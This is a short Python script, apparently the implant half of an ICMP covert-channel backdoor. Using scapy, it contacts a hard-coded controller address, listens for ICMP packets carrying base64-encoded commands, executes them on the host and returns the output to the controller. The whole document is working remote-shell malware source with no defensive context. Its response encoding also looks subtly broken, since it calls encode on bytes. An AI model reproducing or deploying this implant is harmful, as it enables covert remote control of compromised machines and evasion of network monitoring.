#!/usr/bin/python3

from scapy.all import sr,IP,ICMP,Raw,sniff
import base64
from shelly import Host
from subprocess import STDOUT, check_output, TimeoutExpired

ICMP_ID = int(12800)
TTL = int(64)

class Implant(Host):
    
    def __init__(self, controller_ip):
        super().__init__()
        self.controller_ip = controller_ip

    def join(self, shellpack):
        match shellpack['message']:
            case "how are you":
                self.send(self.controller_ip, "join", "fine thank you")

        return

    def instruction(self, shellpack):
        try:
            if shellpack['message'] != 'request':
                raise Exception
            try:
                cmd = base64.b64decode(shellpack['data'].decode()).decode()
                cmd = cmd.split(" ")
                output = check_output(cmd, stderr=STDOUT, timeout=3)
                output = base64.b64encode(output.encode())
                
                self.send(self.controller_ip, "instruction", "response", output.encode())
            except TimeoutExpired:
                raise Exception
        except Exception:
            self.send(self.controller_ip, "error", "error with instruction")

if __name__ == "__main__":
    print("[ Setting up implant... ]")
    print("[ ICMP Sniffing Started ]")
    
    implant = Implant(controller_ip="192.168.157.6")
    print(implant)

    print(" [ Shellpack log ]")
    # Send join command
    implant.send(implant.controller_ip, "join", "hello how are you")

    # Start sniffing
    sniff(iface=implant.iface, prn=implant.sniff_callback, filter="icmp", store="0")
